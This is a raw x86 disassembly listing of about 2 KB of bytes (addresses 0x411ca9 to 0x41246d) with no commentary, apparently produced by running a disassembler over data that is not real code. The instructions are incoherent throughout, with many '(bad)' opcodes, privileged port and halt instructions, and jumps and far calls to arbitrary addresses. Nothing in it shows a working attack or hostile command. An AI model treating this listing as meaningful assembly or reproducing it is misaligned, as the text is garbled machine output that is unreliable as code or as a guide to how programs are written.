  411ca9:	sbb    eax,0x446ccbf6
  411cae:	aas    
  411caf:	jbe    0x411c43
  411cb1:	sub    edi,eax
  411cb3:	mov    cl,0x9c
  411cb5:	arpl   WORD PTR [eax-0x754b2ec1],bp
  411cbb:	out    0x75,eax
  411cbd:	jge    0x411ca5
  411cbf:	lahf   
  411cc0:	dec    edx
  411cc1:	xor    DWORD PTR [edx-0x37],esi
  411cc4:	dec    eax
  411cc5:	test   al,0x43
  411cc7:	pop    ebp
  411cc8:	pusha  
  411cc9:	jge    0x411d26
  411ccb:	imul   ebp,DWORD PTR ds:0xf73929da,0xac0b9d08
  411cd5:	pop    ecx
  411cd6:	mov    edx,0xbe42e579
  411cdb:	bound  ecx,QWORD PTR [edx+0x5e]
  411cde:	xor    eax,0x650968c8
  411ce3:	adc    al,0x12
  411ce5:	add    bh,BYTE PTR [ecx]
  411ce7:	sbb    ebp,ecx
  411ce9:	fdiv   DWORD PTR [ecx]
  411ceb:	fidivr DWORD PTR [esi-0x33ef3a0a]
  411cf1:	js     0x411d3b
  411cf3:	mov    bh,0x3e
  411cf5:	mov    ds:0x6916c8f,eax
  411cfa:	clc    
  411cfb:	mov    eax,DWORD PTR [edi]
  411cfd:	sub    al,0x79
  411cff:	adc    ebx,DWORD PTR ds:0x3ed05b9
  411d05:	sbb    DWORD PTR [esi+0x522ea0b1],ecx
  411d0b:	dec    ebx
  411d0c:	stos   BYTE PTR es:[edi],al
  411d0d:	cmp    al,0xc
  411d0f:	fs inc edi
  411d11:	pop    eax
  411d12:	enter  0x3b0d,0x6e
  411d16:	jno    0x411d39
  411d18:	mov    esi,0xab3ab7be
  411d1d:	outs   dx,BYTE PTR ds:[esi]
  411d1e:	hlt    
  411d1f:	xchg   esp,eax
  411d20:	mov    edx,0xce2ad603
  411d25:	int    0xf6
  411d27:	sbb    al,0x73
  411d29:	loop   0x411d47
  411d2b:	fucomip st,st(5)
  411d2d:	lea    esp,[edx+eiz*1+0x7ed73f02]
  411d34:	adc    esi,edx
  411d36:	adc    ah,ah
  411d38:	or     BYTE PTR [ebx],0x21
  411d3b:	cdq    
  411d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d3d:	and    DWORD PTR [ecx],0xffeaea1a
  411d43:	fstp   st(2)
  411d45:	and    al,0xf8
  411d47:	mov    ch,0x5
  411d49:	add    DWORD PTR [esp+ebx*8+0x82d38b0],ebx
  411d50:	scas   eax,DWORD PTR es:[edi]
  411d51:	out    0xe7,eax
  411d53:	dec    ebx
  411d54:	add    ah,BYTE PTR [esi-0x44badc54]
  411d5a:	out    0xdd,al
  411d5c:	pop    edx
  411d5d:	popf   
  411d5e:	pop    eax
  411d5f:	inc    ebp
  411d60:	push   es
  411d61:	xor    DWORD PTR [edx+0x551ebf4e],esi
  411d67:	adc    eax,0xcdd0d5ca
  411d6c:	mov    al,ds:0x3b3b7050
  411d71:	mov    ds:0xba518694,eax
  411d76:	aam    0xff
  411d78:	add    eax,eax
  411d7a:	adc    BYTE PTR [esi+0x5],0xce
  411d7e:	jae    0x411d95
  411d80:	popa   
  411d81:	mov    ch,0x45
  411d83:	jno    0x411d8c
  411d85:	fwait
  411d86:	pop    edi
  411d87:	and    dh,ch
  411d89:	sub    eax,0x9172d921
  411d8e:	adc    BYTE PTR [edi],0xb7
  411d91:	fcom   QWORD PTR [edi+0x2f]
  411d94:	xchg   esp,eax
  411d95:	and    DWORD PTR [ebp+0x24],ebp
  411d98:	xor    al,0x7c
  411d9a:	and    BYTE PTR [ebx+esi*4],dl
  411d9d:	sbb    BYTE PTR [ebp+0x63],bl
  411da0:	jae    0x411d47
  411da2:	push   edi
  411da3:	inc    esp
  411da4:	rol    DWORD PTR [ebx],1
  411da6:	ficomp WORD PTR ss:[esi+0x71]
  411daa:	rcr    DWORD PTR [esi+esi*1-0x2bb8863a],cl
  411db1:	scas   al,BYTE PTR es:[edi]
  411db2:	mov    ch,0xf7
  411db4:	cmp    bl,al
  411db6:	cmp    eax,0x1feab28f
  411dbb:	lahf   
  411dbc:	jno    0x411dc0
  411dbe:	pop    ecx
  411dbf:	(bad)  
  411dc0:	aad    0x0
  411dc2:	rcl    DWORD PTR [esi+0x6a312c6c],0xf5
  411dc9:	into   
  411dca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dcb:	mov    ecx,0x7d11d42c
  411dd0:	lods   al,BYTE PTR ds:[esi]
  411dd1:	(bad)  
  411dd2:	push   es
  411dd3:	mov    ds:0x3b639902,eax
  411dd8:	sbb    BYTE PTR ds:0xbc206811,0xb0
  411ddf:	jnp    0x411e3e
  411de1:	or     al,0xc7
  411de3:	push   eax
  411de4:	nop
  411de5:	fmul   QWORD PTR [ebp-0x6c739d87]
  411deb:	xchg   edx,edi
  411ded:	sbb    edx,DWORD PTR ds:0x2343d5a3
  411df3:	push   esi
  411df4:	outs   dx,DWORD PTR ds:[esi]
  411df5:	xchg   ecx,eax
  411df6:	dec    edi
  411df7:	stc    
  411df8:	cdq    
  411df9:	or     BYTE PTR [ebp-0x21152b80],ah
  411dff:	mov    WORD PTR [ecx],ds
  411e01:	adc    eax,0x5d2b5f14
  411e06:	out    0x3,eax
  411e08:	jo     0x411daa
  411e0a:	(bad)  
  411e0b:	pusha  
  411e0c:	out    dx,eax
  411e0d:	sti    
  411e0e:	test   ebp,0x41736785
  411e14:	mov    WORD PTR ds:0xfdd67d0c,gs
  411e1a:	mov    edi,0xe4bef9e2
  411e1f:	aam    0xf8
  411e21:	adc    ebp,0xffffffb6
  411e24:	jo     0x411e25
  411e26:	dec    edi
  411e27:	sub    ebp,ebp
  411e29:	sbb    eax,0x9347ede
  411e2e:	pop    esi
  411e2f:	adc    ch,BYTE PTR [edx+0x65813ebc]
  411e35:	test   DWORD PTR [esi],esi
  411e37:	dec    eax
  411e38:	in     eax,0xdb
  411e3a:	dec    eax
  411e3b:	cs and ecx,DWORD PTR ds:[edx]
  411e3f:	enter  0xce1a,0xe1
  411e43:	xchg   esp,eax
  411e44:	mov    es,WORD PTR [esi-0x5b]
  411e47:	push   0xffffffb5
  411e49:	jmp    edx
  411e4b:	fdivr  st(6),st
  411e4d:	out    dx,eax
  411e4e:	mov    ebp,DWORD PTR [eax+0x1fe8b0bc]
  411e54:	dec    esi
  411e55:	cmp    ebx,ebp
  411e57:	addr16 add al,cl
  411e5a:	stos   BYTE PTR es:[edi],al
  411e5b:	sub    ch,BYTE PTR [edx]
  411e5d:	add    ebp,DWORD PTR [edx-0x14]
  411e60:	cs out 0x26,al
  411e63:	push   esp
  411e64:	jns    0x411e39
  411e66:	and    DWORD PTR [ecx],ebp
  411e68:	cwde   
  411e69:	mov    dl,0xc9
  411e6b:	fs dec ecx
  411e6d:	and    al,0x2b
  411e6f:	push   ecx
  411e70:	je     0x411e85
  411e72:	in     eax,0x34
  411e74:	cmp    ah,bl
  411e76:	jno    0x411e37
  411e78:	fsub   DWORD PTR [eax+0x2cb9e5ea]
  411e7e:	(bad)  
  411e7f:	das    
  411e80:	xlat   BYTE PTR ds:[ebx]
  411e81:	in     al,0x24
  411e83:	test   eax,0x5c34d670
  411e88:	dec    edx
  411e89:	sub    eax,0xf078cb50
  411e8e:	dec    edx
  411e8f:	mov    ebp,0x7e746c65
  411e94:	mov    ah,BYTE PTR [edx+0x21]
  411e97:	or     cl,BYTE PTR [edi-0x2efb56cf]
  411e9d:	sub    al,0x73
  411e9f:	lock jg 0x411f05
  411ea2:	push   DWORD PTR [esi]
  411ea4:	into   
  411ea5:	cwde   
  411ea6:	out    dx,eax
  411ea7:	sbb    al,0x51
  411ea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411eaa:	fisub  WORD PTR ds:0x884c4e67
  411eb0:	inc    ecx
  411eb1:	sub    DWORD PTR [esi],esi
  411eb3:	adc    eax,0xe3e371d1
  411eb8:	xor    DWORD PTR [edx+0x34],esi
  411ebb:	inc    ebx
  411ebc:	sbb    al,0x4e
  411ebe:	mov    DWORD PTR [edx+eax*1+0x48],edx
  411ec2:	test   al,0x5d
  411ec4:	and    al,0xaf
  411ec6:	dec    edx
  411ec7:	xchg   esi,eax
  411ec8:	int    0x51
  411eca:	mov    WORD PTR [ebx-0x1bf0ce18],es
  411ed0:	(bad)
  411ed3:	pop    ebx
  411ed4:	dec    esi
  411ed5:	les    ebp,FWORD PTR [ebp+0x1db5d7eb]
  411edb:	inc    esi
  411edc:	adc    DWORD PTR [eax-0x74],eax
  411edf:	sub    DWORD PTR [eax],esp
  411ee1:	inc    esp
  411ee2:	adc    BYTE PTR [ebp-0x322aeb4c],ah
  411ee8:	lock call 0x75b9:0x53693ed5
  411ef0:	or     eax,edx
  411ef2:	in     al,dx
  411ef3:	xor    esi,DWORD PTR [ebx-0x35]
  411ef6:	out    0xf7,eax
  411ef8:	out    dx,al
  411ef9:	dec    ecx
  411efa:	icebp  
  411efb:	ret    
  411efc:	dec    edx
  411efd:	push   ss
  411efe:	push   cs
  411eff:	in     al,0xb3
  411f01:	dec    ebp
  411f02:	into   
  411f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f04:	push   0x5edce8c
  411f09:	inc    esi
  411f0a:	mov    cl,0x21
  411f0c:	adc    DWORD PTR [esi-0x7a546398],0xbb86d616
  411f16:	mov    bl,0xa6
  411f18:	dec    esi
  411f19:	fidivr WORD PTR [ebx-0x234fef5d]
  411f1f:	jmp    0x457f2dee
  411f24:	(bad)  [ecx+0x5]
  411f27:	xchg   esi,eax
  411f28:	push   0xffffffde
  411f2a:	and    eax,0x38436255
  411f2f:	cs ja  0x411ec9
  411f32:	cdq    
  411f33:	mov    DWORD PTR [edx],ecx
  411f35:	push   es
  411f36:	lock fsubr DWORD PTR [ebp+0x3e]
  411f3a:	retf   0x5eb9
  411f3d:	push   0xffffff81
  411f3f:	bound  esi,QWORD PTR [edi]
  411f41:	inc    edx
  411f42:	adc    BYTE PTR [edx+eiz*4],dh
  411f45:	jmp    0x411f98
  411f47:	pop    edx
  411f48:	mov    BYTE PTR [eax+edi*4+0x7e],dh
  411f4c:	mov    eax,0xda93a470
  411f51:	push   ds
  411f52:	je     0x411f86
  411f54:	xor    esi,DWORD PTR [esi]
  411f56:	cmp    ecx,DWORD PTR [eax]
  411f58:	dec    eax
  411f59:	(bad)  
  411f5a:	enter  0x836e,0xe2
  411f5e:	inc    edx
  411f5f:	sub    BYTE PTR [edx+0x24],bl
  411f62:	lea    esp,[ecx+0x5f]
  411f65:	sub    DWORD PTR [ebp-0x702b6cfc],ebx
  411f6b:	hlt    
  411f6c:	sub    ch,BYTE PTR [esi]
  411f6e:	cmp    esi,DWORD PTR [eax-0x4d]
  411f71:	xchg   esp,eax
  411f72:	push   ebx
  411f73:	sub    BYTE PTR [ebx],al
  411f75:	push   cs
  411f76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f77:	sub    al,0x79
  411f79:	mov    BYTE PTR ds:[ebp-0x1c],bh
  411f7d:	mov    ds:0x15f2c316,eax
  411f82:	jg     0x411fa1
  411f84:	mov    DWORD PTR [esp+edi*8],edi
  411f87:	sbb    eax,0x6fd2a7cf
  411f8c:	push   edi
  411f8d:	leave  
  411f8e:	out    0x69,al
  411f90:	sbb    edi,DWORD PTR ds:0x986afe36
  411f96:	sbb    BYTE PTR [edi+edi*2-0x52],0x1d
  411f9b:	sbb    DWORD PTR [esi+ebp*4],ebx
  411f9e:	sbb    BYTE PTR [eax+0x6e20b067],0x1d
  411fa5:	std    
  411fa6:	sub    al,cl
  411fa8:	mov    edi,0x6f36974f
  411fad:	jmp    DWORD PTR [ecx-0x41]
  411fb0:	scas   al,BYTE PTR es:[edi]
  411fb1:	push   cs
  411fb2:	inc    esp
  411fb3:	xchg   ecx,eax
  411fb4:	ds hlt 
  411fb6:	mov    dl,0x15
  411fb8:	pop    es
  411fb9:	dec    edi
  411fba:	lea    edx,ds:[esi+ebx*1+0x5c]
  411fbf:	inc    edx
  411fc0:	outs   dx,DWORD PTR ds:[esi]
  411fc1:	neg    DWORD PTR [ebx-0x5a]
  411fc4:	push   cs
  411fc5:	push   ecx
  411fc6:	loope  0x411fac
  411fc8:	pusha  
  411fc9:	sub    dl,0xd1
  411fcc:	push   edi
  411fcd:	std    
  411fce:	mov    DWORD PTR [ecx+0x41],esi
  411fd1:	jmp    0x106335bc
  411fd6:	data16 xlat BYTE PTR gs:[ebx]
  411fd9:	out    0x42,eax
  411fdb:	pop    ebx
  411fdc:	call   DWORD PTR [esi+0x403fb73c]
  411fe2:	mov    dl,0xdf
  411fe4:	hlt    
  411fe5:	adc    BYTE PTR [ebx+0x37c017cd],ch
  411feb:	pop    es
  411fec:	jbe    0x411f70
  411fee:	nop
  411fef:	push   0xffffffd6
  411ff1:	inc    ebx
  411ff2:	mov    bh,0xf9
  411ff4:	sbb    BYTE PTR [ebx],ch
  411ff6:	pop    ds
  411ff7:	in     al,dx
  411ff8:	jbe    0x411fcd
  411ffa:	and    ecx,DWORD PTR [ebp+edx*4+0x3c]
  411ffe:	test   edx,esi
  412000:	jge    0x411fd6
  412002:	sub    DWORD PTR [eax-0x1bd791b9],esp
  412008:	lahf   
  412009:	adc    ah,bl
  41200b:	arpl   WORD PTR [ebp-0x21],cx
  41200e:	sbb    BYTE PTR [ebx+0x5293068c],al
  412014:	mov    ebp,0xc7a73e77
  412019:	stos   BYTE PTR es:[edi],al
  41201a:	pusha  
  41201b:	add    esi,esp
  41201d:	add    ebx,DWORD PTR [esi+eiz*8-0x3d951145]
  412024:	rcr    ch,cl
  412026:	mov    DWORD PTR ds:0x296a5d7e,ebx
  41202c:	push   ebx
  41202d:	cmp    ah,BYTE PTR [edx]
  41202f:	mov    al,ds:0xd8460484
  412034:	loope  0x411fc7
  412036:	div    DWORD PTR [edi]
  412038:	dec    ebx
  412039:	adc    cl,BYTE PTR [edi-0x32]
  41203c:	shl    DWORD PTR [ebp-0x38],0xff
  412040:	sub    edx,DWORD PTR [edx+0x5d835b8]
  412046:	test   al,0xd6
  412048:	adc    ebx,edi
  41204a:	xchg   edx,eax
  41204b:	jns    0x412020
  41204d:	ret    
  41204e:	std    
  41204f:	push   esi
  412050:	or     dh,BYTE PTR [ebp+0x62d89cd3]
  412056:	ftst   
  412058:	ret    
  412059:	or     eax,0x76514351
  41205e:	xlat   BYTE PTR ds:[ebx]
  41205f:	imul   ebx,DWORD PTR [esi-0x3156208f],0x90a80a77
  412069:	sbb    al,BYTE PTR [edi-0x53]
  41206c:	mov    ebx,0x52f20f91
  412071:	jo     0x4120b3
  412073:	je     0x4120e4
  412075:	(bad)  
  412076:	jmp    0x412082
  412078:	mov    edi,0x91f95fb5
  41207d:	mov    ds:0xc42f485b,al
  412082:	lock es in eax,0x85
  412086:	cwde   
  412087:	fcmovb st,st(1)
  412089:	(bad)  
  41208a:	daa    
  41208b:	push   0x7d
  41208d:	dec    esp
  41208e:	xchg   dl,dl
  412090:	push   esi
  412091:	pop    esp
  412092:	jg     0x4120e9
  412094:	mov    ds:0xc0495042,al
  412099:	mov    ?,WORD PTR [ebp+eiz*4-0x2f]
  41209d:	jl     0x4120d4
  41209f:	push   ds
  4120a0:	xchg   DWORD PTR [ecx-0x175d2aad],esp
  4120a6:	sbb    DWORD PTR [edi],ebx
  4120a8:	mov    DWORD PTR [esp+ebp*4+0x1b],ebp
  4120ac:	outs   dx,DWORD PTR ds:[esi]
  4120ad:	inc    ebx
  4120ae:	xchg   ebx,eax
  4120af:	fistp  DWORD PTR [ebx-0xb]
  4120b2:	jl     0x412103
  4120b4:	popf   
  4120b5:	jbe    0x4120b6
  4120b7:	jle    0x41204d
  4120b9:	xor    BYTE PTR [esp+ebx*2+0x2429b155],0x29
  4120c1:	stos   BYTE PTR es:[edi],al
  4120c2:	xchg   edi,eax
  4120c3:	push   edx
  4120c4:	xor    DWORD PTR [ecx-0x6298dea0],ebp
  4120ca:	xchg   ebx,eax
  4120cb:	not    bl
  4120cd:	cmp    cl,BYTE PTR [ecx+0x22824f8e]
  4120d3:	adc    eax,0xf29c7220
  4120d8:	daa    
  4120d9:	add    eax,0x4d237620
  4120de:	imul   eax,esp,0xffffffbd
  4120e1:	sbb    al,0x9d
  4120e3:	fxch   st(1)
  4120e5:	fst    st(4)
  4120e7:	mov    eax,0x3f16a9fe
  4120ec:	shl    BYTE PTR [edi+eax*1-0x5e],0x5c
  4120f1:	rcr    DWORD PTR [edx],0xcc
  4120f4:	cld    
  4120f5:	push   eax
  4120f6:	loopne 0x412091
  4120f8:	in     eax,0x45
  4120fa:	pop    eax
  4120fb:	ss loopne 0x412117
  4120fe:	mov    ecx,0x6a9d3640
  412103:	cmp    esi,DWORD PTR [edi+esi*1]
  412106:	jecxz  0x4120a1
  412108:	or     bh,BYTE PTR [edi+0x5]
  41210b:	(bad)  
  41210c:	repz adc al,0xc
  41210f:	retf   0x307a
  412112:	xchg   ecx,eax
  412113:	xchg   DWORD PTR [edi],edi
  412115:	lods   eax,DWORD PTR ds:[esi]
  412116:	out    0x3f,al
  412118:	mov    ds:0x168c0bb2,eax
  41211d:	jnp    0x4120d3
  41211f:	daa    
  412120:	jp     0x41219e
  412122:	jmp    0x6e27f553
  412127:	mov    bl,0xe2
  412129:	inc    ebx
  41212a:	test   al,0x54
  41212c:	js     0x41210b
  41212e:	sub    al,0x5b
  412130:	rcr    BYTE PTR [ecx+0x1998c36],0x4b
  412137:	ins    BYTE PTR es:[edi],dx
  412138:	xchg   ebp,edi
  41213a:	jle    0x4121a9
  41213c:	sub    edx,ebx
  41213e:	les    eax,FWORD PTR [ebx]
  412140:	imul   edx,DWORD PTR [edi-0x59],0xe849463e
  412147:	icebp  
  412148:	pushf  
  412149:	(bad)  
  41214a:	and    ebp,esp
  41214c:	pop    edi
  41214d:	sets   bh
  412150:	cmc    
  412151:	jge    0x41219c
  412153:	and    DWORD PTR [ebx],0x1e62303a
  412159:	call   0x628f9b7f
  41215e:	loop   0x4120e2
  412160:	ins    DWORD PTR es:[edi],dx
  412161:	loopne 0x412106
  412163:	retf   
  412164:	adc    al,0x50
  412166:	inc    esp
  412167:	pop    esi
  412168:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41216a:	into   
  41216b:	pop    es
  41216c:	fsub   DWORD PTR [eax]
  41216e:	jp     0x412107
  412170:	lea    eax,[ebx-0x6f]
  412173:	in     al,0x72
  412175:	push   0xffffffe9
  412177:	or     al,0xa2
  412179:	jnp    0x4121ee
  41217b:	cmp    ecx,0xc5c4187c
  412181:	push   esp
  412182:	sub    DWORD PTR [edi],edi
  412184:	cs into 
  412186:	and    DWORD PTR [ecx-0x24],ebp
  412189:	ins    DWORD PTR es:[edi],dx
  41218a:	push   0x1c81be58
  41218f:	fiadd  WORD PTR [esi+0x2c0a2e31]
  412195:	xlat   BYTE PTR ds:[ebx]
  412196:	shl    ecx,cl
  412198:	push   cs
  412199:	sub    BYTE PTR fs:[ecx-0x62735e9a],al
  4121a0:	addr16 dec edx
  4121a2:	stos   BYTE PTR es:[edi],al
  4121a3:	stos   DWORD PTR es:[edi],eax
  4121a4:	xchg   ebp,eax
  4121a5:	sbb    esp,DWORD PTR ds:0xb372da2f
  4121ab:	xlat   BYTE PTR ds:[ebx]
  4121ac:	dec    eax
  4121ad:	sti    
  4121ae:	iret   
  4121af:	adc    DWORD PTR [edi-0x281418be],0xfffffff5
  4121b6:	sbb    BYTE PTR [ebp-0x334c3c56],ah
  4121bc:	fwait
  4121bd:	jl     0x4121c4
  4121bf:	push   es
  4121c0:	jecxz  0x412172
  4121c2:	inc    esp
  4121c3:	xchg   ecx,eax
  4121c4:	cdq    
  4121c5:	mov    bh,0xa2
  4121c7:	lock push eax
  4121c9:	lods   al,BYTE PTR ds:[esi]
  4121ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121cb:	cmp    bl,BYTE PTR [ebp+0x4c]
  4121ce:	mov    ebx,0x72389e50
  4121d3:	test   DWORD PTR [edi+eiz*8],ebx
  4121d6:	xor    esp,DWORD PTR [ecx+0x5]
  4121d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121da:	xor    ebp,DWORD PTR [edi]
  4121dc:	stos   BYTE PTR es:[edi],al
  4121dd:	adc    BYTE PTR [ebp+eax*2-0x4a],0x60
  4121e2:	push   eax
  4121e3:	adc    edx,DWORD PTR [ecx+0x7b25e396]
  4121e9:	mov    DWORD PTR [edi-0x2b6c294b],ebx
  4121ef:	cmp    ch,ch
  4121f1:	mov    al,ds:0xc9a7912f
  4121f6:	(bad)  
  4121f8:	fdiv   QWORD PTR ds:0x95cd209e
  4121fe:	or     BYTE PTR [ecx-0x34],0xc2
  412202:	enter  0xf446,0xf7
  412206:	sahf   
  412207:	lods   al,BYTE PTR ds:[esi]
  412208:	or     al,0x56
  41220a:	mov    esp,eax
  41220c:	dec    edi
  41220d:	push   eax
  41220e:	adc    dl,BYTE PTR [ebx]
  412210:	dec    ecx
  412211:	and    bl,bl
  412213:	sti    
  412214:	xchg   edi,eax
  412215:	xor    DWORD PTR [ebx+eax*1],esp
  412218:	mov    ebp,0xb8d22a72
  41221d:	sub    dl,BYTE PTR [edx]
  41221f:	add    DWORD PTR [ebx+0x7e],ebx
  412222:	aad    0x30
  412224:	and    edx,DWORD PTR [ebx-0x14]
  412227:	mov    edx,0x9705e1e0
  41222c:	mov    ebx,0x82bc7c18
  412231:	dec    ebp
  412232:	loopne 0x41223c
  412234:	cli    
  412235:	adc    bh,dl
  412237:	int3   
  412238:	dec    eax
  412239:	mov    al,BYTE PTR [ebp+0x72]
  41223c:	xchg   edi,eax
  41223d:	add    eax,0x3dccfe7
  412242:	fst    DWORD PTR [edx+0x41]
  412245:	mov    bl,0x1b
  412247:	into   
  412248:	mov    al,0x8c
  41224a:	or     BYTE PTR [edi-0x3c],ch
  41224d:	fwait
  41224e:	aaa    
  41224f:	inc    BYTE PTR [edx+0x2c]
  412252:	push   edi
  412253:	or     DWORD PTR [edi-0x37dcb07],ecx
  412259:	std    
  41225a:	push   es
  41225b:	das    
  41225c:	ins    BYTE PTR es:[edi],dx
  41225d:	mov    ds:0xf221633d,al
  412262:	mov    edx,0x2213d7f3
  412267:	inc    ebp
  412268:	mov    ebx,0x8d8dc2f
  41226d:	push   ds
  41226e:	jnp    0x4122ae
  412270:	test   eax,0xc3a4dbb6
  412275:	test   eax,0x117d7814
  41227a:	mov    ch,0xe9
  41227c:	and    eax,0x7830e9d5
  412281:	cmp    eax,0x5bafb5b2
  412286:	cs mov bl,0xe4
  412289:	dec    ecx
  41228a:	aam    0x84
  41228c:	cmc    
  41228d:	push   0xffffff9a
  41228f:	mov    al,ds:0xdf2381f3
  412294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412295:	mov    dl,0x2
  412297:	cdq    
  412298:	mov    al,0x10
  41229a:	mov    ds:0xe84056ae,eax
  41229f:	out    0xa8,eax
  4122a1:	sti    
  4122a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122a3:	dec    ebx
  4122a4:	mov    edi,0xd9c281b6
  4122a9:	push   es
  4122aa:	das    
  4122ab:	fwait
  4122ac:	or     ah,dh
  4122ae:	stc    
  4122af:	push   esi
  4122b0:	jg     0x412275
  4122b2:	mov    eax,0x45b3d556
  4122b7:	stos   DWORD PTR es:[edi],eax
  4122b8:	sub    eax,0xfa69cd95
  4122bd:	mov    al,dl
  4122bf:	fdiv   DWORD PTR [esi]
  4122c1:	jmp    0x4122af
  4122c3:	and    BYTE PTR [eax+0x165d2942],dl
  4122c9:	fucomip st,st(3)
  4122cb:	call   0xbf91:0xb1292ce
  4122d2:	add    eax,0xf5b4964f
  4122d7:	(bad)  
  4122d8:	call   0x9bba76f8
  4122dd:	stc    
  4122de:	dec    ebx
  4122df:	push   eax
  4122e0:	push   esp
  4122e1:	jle    0x412351
  4122e3:	ret    
  4122e4:	dec    ebx
  4122e5:	adc    eax,0x5abe0203
  4122ea:	sub    eax,0x928eccb9
  4122ef:	add    BYTE PTR [esi],ch
  4122f1:	fidivr DWORD PTR [ebx+0x3370014d]
  4122f7:	shr    BYTE PTR [eax],1
  4122f9:	push   ebx
  4122fa:	shr    BYTE PTR [eax-0x6],0xfa
  4122fe:	or     ch,al
  412300:	xchg   DWORD PTR [edi],eax
  412302:	enter  0x6ec3,0x41
  412306:	mov    bl,0x56
  412308:	loopne 0x41229a
  41230a:	mov    ebx,0x739f1833
  41230f:	pushf  
  412310:	add    DWORD PTR [edi-0x7257af1b],esp
  412316:	and    esi,0x58
  412319:	push   es
  41231a:	or     bl,ah
  41231c:	inc    ebp
  41231d:	gs push esi
  41231f:	mov    BYTE PTR [ecx+ecx*8+0x6a],ah
  412323:	xchg   ebx,eax
  412324:	add    edi,0xffffffdf
  412327:	repnz adc edi,DWORD PTR ds:0x19a20ebb
  41232e:	lock fcomip st,st(3)
  412331:	inc    esi
  412332:	cmp    bl,bl
  412334:	(bad)  
  412335:	scas   eax,DWORD PTR es:[edi]
  412336:	test   eax,0x587d0785
  41233b:	jmp    0x39e82127
  412340:	and    ebx,DWORD PTR [ebx+0x4f]
  412343:	es into 
  412345:	shl    BYTE PTR [esi],0x90
  412348:	sbb    ch,BYTE PTR [esi+0x61]
  41234b:	scas   al,BYTE PTR es:[edi]
  41234c:	call   FWORD PTR [edx-0xbc3fbe]
  412352:	and    al,0x63
  412354:	sub    eax,0xb4eb0d2b
  412359:	loopne 0x412379
  41235b:	cdq    
  41235c:	pop    ecx
  41235d:	and    edi,esi
  41235f:	push   es
  412360:	cmp    eax,0xf29b62c9
  412365:	sahf   
  412366:	inc    ebp
  412367:	ds sti 
  412369:	mov    al,0xb1
  41236b:	(bad)  
  41236c:	out    dx,eax
  41236d:	pop    esi
  41236e:	cld    
  41236f:	add    BYTE PTR [ecx+ecx*2],0xc6
  412373:	mov    WORD PTR [edi+edx*2-0x19645982],?
  41237a:	dec    ecx
  41237b:	retf   
  41237c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41237d:	sub    dh,BYTE PTR [edx+0x69]
  412380:	shr    BYTE PTR [ecx-0x47],0x7c
  412384:	(bad)  
  412385:	sub    BYTE PTR [eax-0x1a],bh
  412388:	retf   
  412389:	(bad)  
  41238a:	pop    eax
  41238b:	inc    esi
  41238c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41238d:	xor    DWORD PTR [ebx+ebp*8-0x68],0xffffffad
  412392:	aas    
  412393:	mov    esi,0xca12689c
  412398:	jg     0x41239f
  41239a:	in     eax,0x1f
  41239c:	js     0x412338
  41239e:	mov    edx,0x1ceb4135
  4123a3:	push   edi
  4123a4:	pusha  
  4123a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123a6:	mov    al,0xa4
  4123a8:	pop    es
  4123a9:	mov    bh,0xb3
  4123ab:	xchg   edi,eax
  4123ac:	mov    ah,0x42
  4123ae:	mov    dh,0x42
  4123b0:	mov    ds,esi
  4123b2:	call   0xc9d4:0xe9ed0adb
  4123b9:	adc    DWORD PTR ds:0x249c1881,0xd4cbdf91
  4123c3:	out    0x6,eax
  4123c5:	jecxz  0x41241b
  4123c7:	xchg   ebp,eax
  4123c8:	xchg   DWORD PTR [ebx+eiz*4-0x36c67069],ebx
  4123cf:	sbb    al,0xbc
  4123d1:	outs   dx,DWORD PTR ds:[esi]
  4123d2:	mov    DWORD PTR ds:0x43554195,ecx
  4123d8:	stos   DWORD PTR es:[edi],eax
  4123d9:	xchg   ecx,eax
  4123da:	mov    dh,0xb7
  4123dc:	jne    0x4123f3
  4123de:	fisubr DWORD PTR [edx+eax*8+0x67]
  4123e2:	lea    edi,[edi]
  4123e4:	push   ecx
  4123e5:	cmp    ecx,edx
  4123e7:	mov    esi,0x9222f2af
  4123ec:	fisubr DWORD PTR [ebx+0x79]
  4123ef:	adc    eax,0x18d0d556
  4123f4:	rcl    cl,0xfd
  4123f7:	sub    bh,bl
  4123f9:	test   DWORD PTR [esi],ebx
  4123fb:	(bad)  
  4123fc:	leave  
  4123fd:	popf   
  4123fe:	dec    esp
  4123ff:	mov    al,BYTE PTR [edi]
  412401:	(bad)  
  412402:	(bad)  
  412403:	or     eax,0x8a5ae919
  412408:	rcr    ah,1
  41240a:	mov    ds:0x8012caab,al
  41240f:	cmp    dh,BYTE PTR [eax+ecx*8]
  412412:	ds mov edi,0x37c40fc0
  412418:	imul   eax,DWORD PTR [ecx+0x44a07dbb],0xa3ee88bd
  412422:	ss dec esp
  412424:	outs   dx,DWORD PTR ds:[esi]
  412425:	ret    
  412426:	out    0x8,al
  412428:	jl     0x412487
  41242a:	test   ch,dh
  41242c:	frstor [ebx]
  41242e:	cmp    dl,al
  412430:	pmulhuw mm4,QWORD PTR [ebx]
  412433:	ret    0x172a
  412436:	add    ebp,DWORD PTR [edi+0x79]
  412439:	xor    eax,0xa95c4895
  41243e:	xor    edx,esp
  412440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412441:	imul   esp,ecx,0xa7e6afb3
  412447:	enter  0xaa26,0x37
  41244b:	outs   dx,DWORD PTR ds:[esi]
  41244c:	int3   
  41244d:	repnz adc ecx,DWORD PTR [ebx+ebp*8]
  412451:	adc    BYTE PTR [esi],bl
  412453:	repz push ebp
  412455:	jecxz  0x4124ad
  412457:	(bad)  
  412458:	in     eax,dx
  412459:	pop    eax
  41245a:	inc    edi
  41245b:	inc    ebp
  41245c:	idiv   BYTE PTR [edx-0x70]
  41245f:	mov    ebp,0xf030121e
  412464:	mov    edi,0xd4ef7614
  412469:	es inc esp
  41246b:	stc    
  41246c:	inc    esp
  41246d:	mov    cl,0xf9
